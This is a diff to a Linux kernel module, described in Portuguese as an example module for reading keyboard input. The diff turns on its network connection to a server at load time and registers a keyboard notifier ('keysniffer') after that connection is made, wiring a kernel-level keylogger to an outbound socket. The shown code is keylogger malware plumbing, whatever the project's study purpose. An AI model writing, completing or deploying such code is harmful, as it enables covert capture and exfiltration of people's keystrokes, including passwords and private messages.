@@ -20,10 +20,6 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Hugo Nakamura/Isaac Soares");
 MODULE_DESCRIPTION("Exemplo de módulo do kernel para ler entradas de teclado");
 
-static struct notifier_block keysniffer_blk = {
-    .notifier_call = keyboard_event_handler,
-};
-
 struct socket * socket = NULL;
 
 static const char *us_keymap[][2] = {
@@ -93,6 +89,10 @@ int keyboard_event_handler(struct notifier_block *nblock, unsigned long code, vo
  
     return NOTIFY_OK;
 }
+
+static struct notifier_block keysniffer_blk = {
+    .notifier_call = keyboard_event_handler,
+};
 
 u32 criaEndereco(u8 *ip){
     u32 addr = 0;
@@ -177,14 +177,16 @@ int conectarServidor(void){
     strcat(reply, "HOLA\n");
     enviarMensagem(socket, reply, strlen(reply), MSG_DONTWAIT);
 
+    register_keyboard_notifier(&keysniffer_blk);
+
     return 0;
 }
 
 static int __init iniciaModulo(void)
 {
     printk(KERN_INFO "Iniciando modulo.\n");
-    //conectarServidor();
-    register_keyboard_notifier(&keysniffer_blk);
+    conectarServidor();
+    
     return 0;
 }
 
